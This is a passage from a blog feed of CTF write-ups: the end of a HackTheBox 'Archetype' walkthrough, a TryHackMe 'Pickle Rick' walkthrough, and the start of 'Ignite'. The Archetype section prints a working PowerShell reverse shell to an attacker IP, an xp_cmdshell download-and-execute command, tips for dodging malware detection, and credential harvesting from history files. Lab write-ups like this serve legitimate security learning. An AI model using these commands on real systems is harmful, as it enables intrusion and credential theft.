KiloBytes/sec) (average 3.2 KiloBytes/sec)&lt;br&gt;&lt;/pre&gt;&lt;/p&gt;&lt;p&gt;Once the configuration file is open, I can see the credentials in it: &lt;i&gt;ARCHETYPE\sql_svc:M3g4c0rp123&lt;/i&gt;Since SQL appears on the user sunday most likely he is part of SQL account. In fact, from the Nmap scan, there is an &lt;b&gt;ms-sql-s&lt;b&gt; service on port 1322.&lt;/p&gt;&lt;p&gt;When it prompt for the password, enter the password found in the configuration file.&lt;/p&gt;&lt;p&gt;&lt;pre&gt;$ python3 /usr/share/doc/python3-impacket/examples/mssqlclient.py sql_svc@10.10.10.27 -windows-auth&lt;br&gt;Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation&lt;br&gt;&lt;br&gt;Password:&lt;br&gt;[*] Encryption required, switching to TLS&lt;br&gt;[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master&lt;br&gt;[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english&lt;br&gt;[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192&lt;br&gt;[*] INFO(ARCHETYPE): Line 1: Changed database context to &apos;master&apos;.&lt;br&gt;[*] INFO(ARCHETYPE): Line 1: Changed language setting to us_english.&lt;br&gt;[*] ACK: Result: 1 - Microsoft SQL Server (140 3232) &lt;br&gt;[!] Press help for extra shell commands&lt;br&gt;SQL&gt; &lt;br&gt;&lt;/pre&gt;&lt;/p&gt;&lt;p&gt;To check the permissions of the current user I execute the following query, if from 1 then it means that he has the permissions indicated otherwise not.&lt;/p&gt;&lt;p&gt;&lt;pre class=&quot;sql-code&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;SQL&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;keyword&quot;&gt;select&lt;/span&gt; &lt;span class=&quot;function&quot;&gt;IS_SRVROLEMEMBER&lt;/span&gt; (&apos;sysadmin&apos;)&lt;br&gt;&lt;span class=&quot;output&quot;&gt;-----------&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;&lt;/pre&gt;&lt;/p&gt;&lt;p&gt;I make an attempt to run some code with the xp_cmdshell function. I have to run the command &lt;code&gt;EXEC sp_configure &apos;Show Advanced Options&apos;, 1;&lt;/code&gt; to configure &lt;i&gt;xp_cmdshell&lt;/i&gt; and after each command, I have to issue &lt;code&gt;reconfigure;&lt;/code&gt;. Instead, to enable it I have to run this other command &lt;code&gt;EXEC sp_configure &apos;xp_cmdshell&apos;, 1;&lt;/code&gt; and obviously &lt;code&gt;reconfigure;&lt;/code&gt;. And finally, I can execute the commands &lt;code&gt;xp_cmdshell &lt;&quot;command&quot;&gt;&lt;/code&gt;.&lt;/p&gt;&lt;p&gt;&lt;pre class=&quot;sql-code&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;EXEC&lt;/span&gt; &lt;span class=&quot;function&quot;&gt;sp_configure&lt;/span&gt;(&lt;span class=&quot;string&quot;&gt;&apos;Show Advanced Options&apos;&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;);&lt;br&gt;&lt;span class=&quot;comment&quot;&gt;[*] INFO(ARCHETYPE): Line 185: Configuration option &apos;show advanced options&apos; changed from 1 to 1. Run the RECONFIGURE statement to install.&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;keyword&quot;&gt;reconfigure&lt;/span&gt;;&lt;br&gt;&lt;span class=&quot;keyword&quot;&gt;EXEC&lt;/span&gt; &lt;span class=&quot;function&quot;&gt;sp_configure&lt;/span&gt;(&lt;span class=&quot;string&quot;&gt;&apos;xp_cmdshell&apos;&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;);&lt;br&gt;&lt;span class=&quot;comment&quot;&gt;[*] INFO(ARCHETYPE): Line 185: Configuration option &apos;xp_cmdshell&apos; changed from 1 to 1. Run the RECONFIGURE statement to install.&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;keyword&quot;&gt;reconfigure&lt;/span&gt;;&lt;br&gt;&lt;span class=&quot;function&quot;&gt;xp_cmdshell&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&quot;whoami&quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;keyword&quot;&gt;output&lt;/span&gt;                                                                             &lt;br&gt;--------------------------------------------------------------------------------   &lt;br&gt;&lt;span class=&quot;string&quot;&gt;archetype\sql_svc&lt;/span&gt;                                                 &lt;br&gt;&lt;span class=&quot;keyword&quot;&gt;NULL&lt;/span&gt;&lt;/pre&gt;&lt;/p&gt;&lt;p&gt;For the reverse shell I have to use the one indicated on the official writeup as it checks for malicious pieces of Powershell code.&lt;/p&gt;&lt;p&gt;&lt;pre class=&quot;powershell-code&quot;&gt;&lt;span class=&quot;variable&quot;&gt;$client&lt;/span&gt; = &lt;span class=&quot;cmdlet&quot;&gt;New-Object&lt;/span&gt; &lt;span class=&quot;type&quot;&gt;System.Net.Sockets.TCPClient&lt;/span&gt;(&quot;10.10.14.84&quot;, 4444);&lt;br&gt;&lt;span class=&quot;variable&quot;&gt;$stream&lt;/span&gt; = &lt;span class=&quot;variable&quot;&gt;$client&lt;/span&gt;.&lt;span class=&quot;method&quot;&gt;GetStream&lt;/span&gt;();&lt;br&gt;&lt;span class=&quot;type&quot;&gt;[byte[]]&lt;/span&gt;&lt;span class=&quot;variable&quot;&gt;$bytes&lt;/span&gt; = 0..65535 | &lt;span class=&quot;cmdlet&quot;&gt;%&lt;/span&gt;{0};&lt;br&gt;&lt;span class=&quot;keyword&quot;&gt;while&lt;/span&gt;(&lt;span class=&quot;condition&quot;&gt;($i = $stream.Read($bytes, 0, $bytes.Length))&lt;/span&gt; -ne 0) {&lt;br&gt;    &lt;span class=&quot;variable&quot;&gt;$data&lt;/span&gt; = (&lt;span class=&quot;cmdlet&quot;&gt;New-Object&lt;/span&gt; -&lt;span class=&quot;parameter&quot;&gt;TypeName&lt;/span&gt; &lt;span class=&quot;type&quot;&gt;System.Text.ASCIIEncoding&lt;/span&gt;).&lt;span class=&quot;method&quot;&gt;GetString&lt;/span&gt;($bytes, 0, $i);&lt;br&gt;    &lt;span class=&quot;variable&quot;&gt;$sendback&lt;/span&gt; = (&lt;span class=&quot;cmdlet&quot;&gt;iex&lt;/span&gt; &lt;span class=&quot;variable&quot;&gt;$data&lt;/span&gt; 2&gt;&amp;1 | &lt;span class=&quot;cmdlet&quot;&gt;Out-String&lt;/span&gt;);&lt;br&gt;    &lt;span class=&quot;variable&quot;&gt;$sendback2&lt;/span&gt; = &lt;span class=&quot;variable&quot;&gt;$sendback&lt;/span&gt; + &quot;# &quot;;&lt;br&gt;    &lt;span class=&quot;variable&quot;&gt;$sendbyte&lt;/span&gt; = ([text.encoding]::ASCII).&lt;span class=&quot;method&quot;&gt;GetBytes&lt;/span&gt;(&lt;span class=&quot;variable&quot;&gt;$sendback2&lt;/span&gt;);&lt;br&gt;    &lt;span class=&quot;variable&quot;&gt;$stream&lt;/span&gt;.&lt;span class=&quot;method&quot;&gt;Write&lt;/span&gt;($sendbyte, 0, $sendbyte.Length);&lt;br&gt;    &lt;span class=&quot;variable&quot;&gt;$stream&lt;/span&gt;.&lt;span class=&quot;method&quot;&gt;Flush&lt;/span&gt;();&lt;br&gt;}&lt;br&gt;&lt;span class=&quot;variable&quot;&gt;$client&lt;/span&gt;.&lt;span class=&quot;method&quot;&gt;Close&lt;/span&gt;();&lt;/pre&gt;&lt;/p&gt;&lt;p&gt;Copy and paste the code into a text file and save it with the &lt;b&gt;.ps1&lt;/b&gt; extension.&lt;/p&gt;If you try another reverse shell and it doesn&apos;t work most likely some of the code is identified as a malicious one and should be adjusted appropriately. For example In the code above &lt;code&gt;PS&quot; + (pwd).Path + &quot;&gt;&lt;/code&gt; has been replaced with `#` because it is identified as a malicious string, moreover, that string is not in any way useful for the operation of the reverse shell but only serves to give a friendlier prompt to the user. This issue was thiscussed in the following link at the time whe the box was active: &lt;a href=&quot;https://forum.hackthebox.eu/discussion/3509/starting-point&quot;&gt;https://forum.hackthebox.eu/discussion/3509/starting-point&lt;/a&gt;.&lt;hr&gt;&lt;p&gt;In order to download the reverse shell I have to start e web server, for simplicity in the same forder where i have my reverse shell.&lt;/p&gt;&lt;p&gt;&lt;div class=&quot;terminal&quot;&gt;&lt;span class=&quot;prompt&quot;&gt;(kali@kali)~$&lt;/span&gt; &lt;span class=&quot;command&quot;&gt;python3 -m http.server 8800&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;command&quot;&gt;Serving HTTP on 0.0.0.0 port 8800 (http://0.0.0.0:8800/) ...&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;command&quot;&gt;10.10.10.27 - - [19/Jun/2021 06:24:20] &quot;GET /rev.ps1 HTTP/1.1&quot; 200 -&lt;/span&gt;&lt;br&gt;&lt;/div&gt;&lt;/p&gt;&lt;p&gt;Before downloading and executing the reverse shell I have to listen to the set port with NetCat on another shell.&lt;/p&gt;&lt;p&gt;&lt;/p&gt;&lt;p&gt;And finally to download and execute in one shot the reverse shell I use the following Powershell command on the SQL shell, the one where I used mssqlclient.py.&lt;/p&gt;&lt;p&gt;&lt;div class=&quot;terminal&quot;&gt;&lt;span class=&quot;command&quot;&gt;xp_cmdshell &lt;/span&gt;&lt;span class=&quot;quote&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;keyword&quot;&gt;powershell&lt;/span&gt;&lt;span class=&quot;quote&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;command&quot;&gt;IEX &lt;/span&gt;&lt;span class=&quot;keyword&quot;&gt;(New-Object&lt;/span&gt;&lt;span class=&quot;type&quot;&gt;Net.WebClient&lt;/span&gt;)&lt;span class=&quot;method&quot;&gt;.DownloadString&lt;/span&gt;&lt;span class=&quot;quote&quot;&gt;&quot;&lt;/span&gt;http://10.10.14.84:8800/rev.ps1&lt;span class=&quot;quote&quot;&gt;&quot;&lt;/span&gt;;&lt;/div&gt;&lt;/p&gt;&lt;p&gt;Once connected I obtained a shell where I can run Windows commands.&lt;/p&gt;&lt;p&gt;&lt;div class=&quot;terminal&quot;&gt;&lt;span class=&quot;prompt&quot;&gt;(kali@kali)&lt;/span&gt;&lt;span class=&quot;path&quot;&gt;~/htb/archetype$&lt;/span&gt;&lt;span class=&quot;command&quot;&gt;nc &lt;/span&gt;-lvp&lt;/span&gt; 4444 listening on [any] 4444 ...&lt;br/&gt;10.10.10.27: inverse host lookup failed: Unknown host&lt;br/&gt;connect to [10.10.14.84] from (UNKNOWN) [10.10.10.27] 49681&lt;br&gt;#&lt;/div&gt;&lt;/p&gt;&lt;p&gt;As this is a normal user account as well as a service account, it is worth checking for frequently access files or executed commands. We can use the command below to accessed the PowerShell history file.&lt;/p&gt;&lt;p&gt;&lt;pre&gt;# type C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt&lt;br&gt;net.exe use T: \\Archetype\backups /user:administrator MEGACORP_4dm1n!!&lt;/pre&gt;&lt;/p&gt;&lt;p&gt;So the credentials for the share backups are: &lt;i&gt;administrator:MEGACORP_4dm1n!!&lt;/i&gt;.&lt;/p&gt;&lt;p&gt;&lt;pre class=&quot;terminal&quot;&gt;&lt;span class=&quot;prompt&quot;&gt;(kali@kali)&lt;/span&gt;&lt;span class=&quot;path&quot;&gt;~/htb/archetype$&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;command&quot;&gt;python3&lt;/span&gt;/usr/share/doc/python3-impacket/examples/psexec.py administrator@10.10.10.27&lt;br&gt;Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation&lt;br&gt;&lt;br&gt;Password:&lt;br&gt;[*] Requesting shares on 10.10.10.27.....&lt;br&gt;[*] Found writable share ADMIN$&lt;br&gt;[*] Uploading file ehFXfEZp.exe&lt;br&gt;[*] Opening SVCManager on 10.10.10.27.....&lt;br&gt;[*] Creating service FpdE on 10.10.10.27.....&lt;br&gt;[*] Starting service FpdE.....&lt;br&gt;[!] Press help for extra shell commands&lt;br&gt;Microsoft Windows [Version 10.0.17763.107]&lt;br&gt;(c) 2018 Microsoft Corporation. All rights reserved.&lt;br&gt;&lt;br&gt;C:\Windows\system32&gt;&lt;br&gt;&lt;/pre&gt;&lt;/p&gt;The root flag si in the Administrator&apos;s desktop.&lt;p&gt;&lt;pre&gt;Directory of C:\Users\Administrator\Desktop&lt;br&gt;&lt;br&gt;01/20/2020  06:42 AM    &amp;lt;DIR&amp;gt;          .&lt;br&gt;01/20/2020  06:42 AM    &amp;lt;DIR&amp;gt;          ..&lt;br&gt;02/25/2020  07:36 AM                32 root.txt&lt;br&gt;               1 File(s)             32 bytes&lt;br&gt;               2 Dir(s)  33,819,779,072 bytes free&lt;br&gt;&lt;br&gt;C:\Users\Administrator\Desktop&gt;type root.txt&lt;br&gt;b91ccec3305e98240082d4474b848528&lt;br&gt;&lt;/pre&gt;&lt;/p&gt;</content>
        
          <category term="easy"/>
        
          <category term="ctf"/>
        
          <category term="box"/>
        
          <category term="htb"/>
        
          <category term="smb"/>
        
          <category term="sql"/>
        
          <category term="powershell"/>
        
          <category term="iex"/>
        
          <category term="python webserver"/>
        
          <category term="curl"/>
        
          <category term="download file"/>
        
          <category term="powershell iex"/>
        
          <category term="windows"/>
        
          <category term="privesc"/>
        
          <category term="smbclient"/>
        
          <category term="crackmapexec"/>
        
          <category term="rce"/>
        
      </item>
    
      <item>
        <title>Pickle Rick</title>
        <link href="https://benwick921.github.io/cyber/writeup/pickle-rick/" rel="alternate" type="text/html" title="Pickle Rick"/>
        <guid>https://benwick921.github.io/cyber/writeup/pickle-rick/</guid>
        <pubDate>Thu, 27 Mar 2025 00:35:02 GMT</pubDate>
        <lastBuildDate>Thu, 27 Mar 2025 00:35:02 GMT</lastBuildDate> 
        <content type="html" xml:base="Thu, 27 Mar 2025 00:35:02 GMT">&lt;img src=&quot;/cyber/writeup/picklerick/banner.gif&quot; alt=&quot;&quot;&gt;&lt;p&gt;This Rick and Morty-themed challenge requires you to exploit a web server and find three ingredients to help Rick make his potion and transform himself back into a human from a pickle.&lt;/p&gt;&lt;p&gt;The first step in the enumeration that I do is always enumerating the box with &lt;code&gt;Nmap&lt;/code&gt;. The command that I used is: &lt;code&gt;nmap -sC -V -oN nmap-script &amp;lt;ip&amp;gt; -p-&lt;/code&gt; I always use the flag &lt;code&gt;-oN&lt;/code&gt; to save the Nmap result for later review. The rest Nmap gave me was:&lt;/p&gt;&lt;p&gt;&lt;pre&gt;┌──(kali㉿kali)-[192.168.213.128]-[13:48:38 12/09/2024]-[~/thm/pickle-rick] &lt;br&gt;└─$ nmap -sC -sV -oN snmap-scan [ip] -p- &lt;br&gt;# Nmap 7.94SVN scan initiated Thu Sep 12 13:06:31 2024 as: nmap -sC -sV -oN nmap-scan 10.10.96.74&lt;br&gt;Nmap scan report for 10.10.96.74&lt;br&gt;Host is up (0.023s latency).&lt;br&gt;Not shown: 998 closed tcp ports (conn-refused)&lt;br&gt;PORT   STATE SERVICE VERSION&lt;br&gt;22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)&lt;br&gt;| ssh-hostkey: &lt;br&gt;|   3072 b7:33:d5:d9:db:e0:81:a9:f8:5d:a4:4f:36:16:a3:4a (RSA)&lt;br&gt;|   256 6a:e2:88:84:d1:1a:b0:8b:bd:e3:de:20:99:e9:bb:f8 (ECDSA)&lt;br&gt;|_  256 15:ba:da:57:13:f0:27:8b:0a:ab:c5:f2:1e:16:41:21 (ED25519)&lt;br&gt;80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))&lt;br&gt;|_http-title: Rick is sup4r cool&lt;br&gt;|_http-server-header: Apache/2.4.41 (Ubuntu)&lt;br&gt;Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel&lt;br&gt;&lt;br&gt;Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .&lt;br&gt;# Nmap done at Thu Sep 12 13:06:39 2024 -- 1 IP address (1 host up) scanned in 7.96 seconds&lt;br&gt;&lt;br&gt;&lt;/pre&gt;&lt;/p&gt;&lt;p&gt;So now we have two services: SSH and HTTP. At this point, I know that I can&apos;t use SSH because I do not have any credentials or SSH keys, so it&apos;s better not to even try it. Let&apos;s go with the HTTP service. The best way is to paste the IP address into a browser to check the website.&lt;/p&gt;&lt;p&gt;&lt;img src=&quot;/cyber/writeup/picklerick/9b0024882c2a483abf006a957b0cd521.png&quot;&gt;&lt;/p&gt;&lt;p&gt;It is a simple page with a description and an image. At first glance, it seems nothing is interesting. From here we can do a few things to enumerate the website:&lt;/p&gt;&lt;ol&gt;&lt;li&gt;check source code&lt;/li&gt;&lt;li&gt;check cookies&lt;/li&gt;&lt;li&gt;check eventual javascript files&lt;/li&gt;&lt;li&gt;monitor the communication with BurpSuite&lt;/li&gt;&lt;li&gt;directory brute forcing&lt;/li&gt;&lt;li&gt;the 6th idea came into my mind later, not immediately. I will discuss it later in the writeup&lt;/li&gt;&lt;/ol&gt;&lt;p&gt;To be more efficient I run first of all directory brute forcing with &lt;code&gt;gobuster&lt;/code&gt;:&lt;/p&gt;&lt;pre&gt;gobuster dir -u http://10.10.181.218/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt &lt;/pre&gt;&lt;p&gt;And the rest was the discovery of the &lt;code&gt;/asset&lt;/code&gt; directory path, which was very disappointing.&lt;br&gt;&lt;p&gt;&lt;img src=&quot;/cyber/writeup/picklerick/e560f71aeb5d4d07936f68004469d3f6.png&quot;&gt;&lt;/p&gt;&lt;p&gt;I will get back to this result later.&lt;/p&gt;&lt;p&gt;While &lt;code&gt;gobuster&lt;/code&gt; was running I was assessing the website manually (points 1, 2 and 3 previously mentioned). Checking the source code I found a comment exposing the user name.&lt;/p&gt;&lt;img src=&quot;/cyber/writeup/picklerick/077a28ad3abb4749a3d763cc5e7042c1.png&quot;&gt;&lt;p&gt;Easy peasy, I got the username!&lt;/p&gt;&lt;img src=&quot;/cyber/writeup/picklerick/ef9f5ac16ca74257b228917e48af302c.png&quot;&gt;&lt;p&gt;The first step is done! The second step is checking the cookies. But the site has no cookies.&lt;/p&gt;&lt;p&gt;&lt;img src=&quot;/cyber/writeup/picklerick/2aa969a5929c43c1a2a3e89c811623b6.png&quot;&gt;&lt;/p&gt;&lt;p&gt;&lt;img src=&quot;/cyber/writeup/picklerick/a47731de72cc4febafb98bcf5a79189b.png&quot;&lt;/p&gt;&lt;p&gt;The third step is to check any javascript files. But there were only JS libraries used to create the website, the standard bootstrap JS files, nothing interesting.&lt;/p&gt;&lt;p&gt;&lt;img src=&quot;/cyber/writeup/picklerick/e8a1b12ebba9478f916b2a1cd0c91a87.png&quot;&lt;/p&gt;&lt;p&gt;&lt;img src=&quot;/cyber/writeup/picklerick/b09716ab63b74464975dcf6966a87eb1.png&quot;&lt;/p&gt;&lt;p&gt;At this point I started to lose hope, how can an easy box put me in such a difficult position?&lt;/p&gt;&lt;img src=&quot;/cyber/writeup/picklerick/250b2e46e84346a78c088cfd979a282b.png&quot;&gt;&lt;p&gt;In the meantime, BurpSuite logged a few interactions with the website but I did not find anything interesting. I was hoping to find some GET and POST parameters like user or admin parameter to elevate my privilege but no such thing was implemented.&lt;/p&gt;&lt;img src=&quot;/cyber/writeup/picklerick/90ae686a1e294f6db722c52140bf9bc9.png&quot;&gt;&lt;p&gt;I even tried manually to access some paths as you can see from the screenshot such as&lt;/p&gt;&lt;ul&gt;&lt;li&gt;/management&lt;/li&gt;&lt;li&gt;/panel&lt;/li&gt;&lt;li&gt;/apache&lt;/li&gt;&lt;li&gt;/console&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;And none of them worked. At this moment I remembered about &lt;em&gt;robots.txt&lt;/em&gt; the 6th point that was missing from the above list. The &lt;b&gt;robots.txt&lt;/b&gt; disclosed an alphabetic string: &lt;strong&gt;Wubbalubbadubdub&lt;/strong&gt;. As I found the username earlier maybe this could be the password, but I didn&apos;t give it for granted it can be a rabbit hole.&lt;/p&gt;&lt;p&gt;Having these 2 findings, the username and a possible password I started to play for almost 1 hour with the SSH service trying to log in. It gave me several error messages and I tried to fix them and eventually I gave up on SSH and went back to the website. The SSH service was a rabbit hole and it lost 1 hour of my time but it enhanced my ability to detect rabbit holes. It was not totally useless and I learnt a few things about SSH config files as well, who knows it may came in handy in future challenges.&lt;/p&gt;&lt;img src=&quot;/cyber/writeup/picklerick/e09a517beea740128d38c8df0757f75a.png&quot;&gt;&lt;p&gt;At this point, I checked the &lt;code &gt;gobuster&lt;/code&gt; result and it shows &lt;code&gt;/asset&lt;/code&gt;. By accessing it I can see some static files like image files, javascript and CSS.&lt;/p&gt;&lt;img src=&quot;/cyber/writeup/picklerick/e31eb957e2fc451ca5a90e5a445c8809.png&quot;&gt;&lt;p&gt;I admit at this point I was tempted to take a peek at the solution but I resisted! So far I have checked all the 6 points listed. Given the number of images, I thought there may be some steganography challenge, so I downloaded a few images and I tried to see if the images had some information in string format inside the images with the command &lt;code&gt;strings&lt;/code&gt;: &lt;code&gt;strings &amp;lt;filename&amp;gt;&lt;/code&gt;; &lt;code&gt;strings portal.jpg&lt;/code&gt; Also this attempt failed.&lt;/p&gt;&lt;img src=&quot;/cyber/writeup/picklerick/9b987dea25f4429fa5952f0035e4df6a.png&quot;&gt;&lt;p&gt;I searched on Google for &lt;em&gt;web enumeration&lt;/em&gt; and read a few pages about people doing web enumeration of other challenges and I noticed they were using &lt;code&gt;seclists&lt;/code&gt; wordlist. I immediately installed &lt;code&gt;seclists&lt;/code&gt; by typing &lt;code&gt;sudo apt install seclists&lt;/code&gt;. I ran Gobuster again, and while I was reading the available options, one in particular caught my eye, the &lt;code&gt;-x&lt;/code&gt; that I used to use. This option looks for files ending with a certain extension. &lt;code&gt;-x,  --extensions string /t/t File extension(s) to search for&lt;/code&gt;. I returned to Gobuster with pretty much identical flags and the same wordlist this time from a different path and I added &lt;code&gt;-x txt,php&lt;/code&gt;. Now why did I add .php? It was just an educated guess as most of the boxes that I played had PHP. I was also tempted to add more extensions such as .pdf, .js, and .css but they are not useful to me and they will certainly make it run slower. So the command I ran was:&lt;/p&gt;&lt;p&gt;&lt;code&gt;gobuster dir -u http://10.10.61.243/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -x txt,php&lt;/code&gt; This time the result was very different. I did not let Gobuster go through the whole wordlist as it started to give me errors so I stopped it.&lt;/p&gt;&lt;img src=&quot;/cyber/writeup/picklerick/2643da1c9c5d48868aeb26ed518ecba4.png&quot;&gt;&lt;p&gt;This new finding brought immediately my morale up! I tried &lt;b&gt;portal.php&lt;/b&gt; and &lt;b&gt;login.php&lt;/b&gt; both ended up in &lt;b&gt;login.php&lt;/b&gt;. Inserting the username and the string &lt;strong&gt;Wubbalubbadubdub&lt;/strong&gt; logged me into a page where I can run bash commands.&lt;/p&gt;&lt;img src=&quot;/cyber/writeup/picklerick/c6f964976a24417083e1754a280b9b71.png&quot;&gt;&lt;br&gt;&lt;p&gt;Now is the time to read the file and search for the ingredients. First thing is &lt;code&gt;ls&lt;/code&gt; list the directory to see what files it contains and immediately I can see it has a file named &lt;strong&gt;Sup3rS3cretPickl3Ingred.txt&lt;/strong&gt;. Trying to &lt;code&gt;cat&lt;/code&gt; it I receive the following error message.&lt;/p&gt;&lt;img src=&quot;/cyber/writeup/picklerick/0bbba0bcb55049eb9a3689f871cb918c.png&quot;&gt;&lt;p&gt;Damn! I can&apos;t use the &lt;code&gt;cat&lt;/code&gt; command! Wait a minute... I know more commands to achieve similar results thanks to my experiences with Linux and they are:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;more&lt;/li&gt;&lt;li&gt;less&lt;/li&gt;&lt;li&gt;strings&lt;/li&gt;&lt;li&gt;vim&lt;/li&gt;&lt;li&gt;nano&lt;/li&gt;&lt;li&gt;vi&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;Note that I listed 3 text editors as well, my idea was to try to open the file with one of the text editors to see the content. Among all the commands listed the command &lt;code&gt;less&lt;/code&gt; worded for the first ingredient and later on I found out that the command &lt;code&gt;strings&lt;/code&gt; works for all the ingredients so I will use the command &lt;code&gt;strings&lt;/code&gt;.&lt;/p&gt;&lt;p&gt;The first ingredient is done now tome to look for the other two. After exploring the system I found out that the second ingredient is in Rick&apos;s home directory.&lt;/p&gt;&lt;img src=&quot;/cyber/writeup/picklerick/88916f0602614fc687c881f91984417a.png&quot;&gt;&lt;p&gt;Let&apos;s try to read it with &lt;code&gt;strings&lt;/code&gt;. Trying to read the file with the following command &lt;code&gt;strings /home/rick/second ingredient&lt;/code&gt; gives me empty results.&lt;/p&gt;&lt;img src=&quot;/cyber/writeup/picklerick/69dbeb99663748c0a095197d7540af6d.png&quot;&gt;&lt;p&gt;How come? I know it! Thanks to a bash CTF that I have done when I started my journey in the Cybersecurity field I had to face a similar challenge. The CTF is called &lt;strong&gt;OverTheWire&lt;/strong&gt; and the level was &lt;strong&gt;Bandit&lt;/strong&gt;. The issue is with the space in the file name. By wrapping it with quotes it solves the issue. &lt;code&gt;strings &amp;quot;/home/rick/second ingredients&amp;quot;&lt;/code&gt;&lt;/p&gt;&lt;img src=&quot;/cyber/writeup/picklerick/972094d0419940e8be2c04439dfb37de.png&quot;&gt;&lt;p&gt;Now it&apos;s time to find the 3rd ingredient. After spending some time I tried to access the root folder but I could not. So as I used to do during privilege escalation in other boxes I ran &lt;code&gt;sudo -l&lt;/code&gt; and surprisingly I had the following output.&lt;/p&gt;&lt;img src=&quot;/cyber/writeup/picklerick/d1bc4148d2cf4d07b6fc17add34f4021.png&quot;&gt;&lt;p&gt;I can run any command as sudo! So the command that I have to run is &lt;code&gt;sudo ls /root&lt;/code&gt; and I can see the name of the 3rd ingredient.&lt;/p&gt;&lt;img src=&quot;/cyber/writeup/picklerick/2f20d7cadd9f4c22b273844bad5fff5b.png&quot;&gt;&lt;p&gt;Now let&apos;s try to read it &lt;code&gt;sudo strings /root/3rd.txt&lt;/code&gt;&lt;/p&gt;&lt;img src=&quot;/cyber/writeup/picklerick/53c856177d8b4a089b6dfca3cebc9553.png&quot;&gt;&lt;p&gt;And finally here is the 3rd ingredient.&lt;/p&gt;&lt;img src=&quot;/cyber/writeup/picklerick/1fa8d0f9018b44588079e66b888732ee.png&quot;&gt;&lt;br&gt;&lt;p&gt;During the challenge at a certain point, I thought I had to obtain a reverse shell and spent almost 2 hours trying to achieve it via the browser and BurpSuite. I tried various techniques, strategies and different encoding but they did not work. I also tried to upload a reverse shell which did not work as well.&lt;/p&gt;&lt;p&gt;During all these failed attepts I learned other things even if they were not related to the completion of the challenge. But for sure the time spent for on the failed attempts was not wasted at all. I took my time to assess the website thoroughly, I did my research without rushing it. When needed I took a peek at the solution as long as it helped me to learn. The key is patience. Also, I was able to finish the challenge very quickly once I took my lunch break, seems my mind cleared.&lt;/p&gt;</content>
        
          <category term="easy"/>
        
          <category term="security"/>
        
          <category term="ctf"/>
        
          <category term="bash"/>
        
          <category term="web"/>
        
          <category term="linux"/>
        
          <category term="thm"/>
        
      </item>
    
      <item>
        <title>Ignite</title>
        <link href="https://benwick921.github.io/cyber/writeup/ignite/" rel="alternate" type="text/html" title="Ignite"/>
        <guid>https://benwick921.github.io/cyber/writeup/ignite/</guid>
        <pubDate>Thu, 27 Mar 2025 00:35:02 GMT</pubDate>
        <lastBuildDate>Thu, 27 Mar 2025 00:35:02 GMT</lastBuildDate> 
        <content type="html" xml:base="Thu, 27 Mar 2025 00:35:02 GMT">&lt;img src=&quot;/cyber/writeup/ignite/banner.gif&quot; alt=&quot;&quot;&gt;&lt;hr&gt;&lt;br&gt;&lt;pre&gt;Nmap 7.91 scan initiated Thu Sep 16 15:42:21 2021 as: nmap -sC -sV -A -p- -oN nmap 10.10.238.237&lt;br&gt;Nmap scan report for ip-10-10-238-237.eu-west-1.compute.internal (10.10.238.237)&lt;br&gt;Host is up (0.014s latency).&lt;br&gt;Not shown: 65534 closed ports&lt;br&gt;PORT   STATE SERVICE VERSION&lt;br&gt;80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))&lt;br&gt;| http-robots.txt: 1 disallowed entry &lt;br&gt;|_/fuel/&lt;br&gt;|_http-server-header: Apache/2.4.18 (Ubuntu)&lt;br&gt;|_http-title: Welcome to FUEL CMS&lt;br&gt;No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).&lt;br&gt;TCP/IP 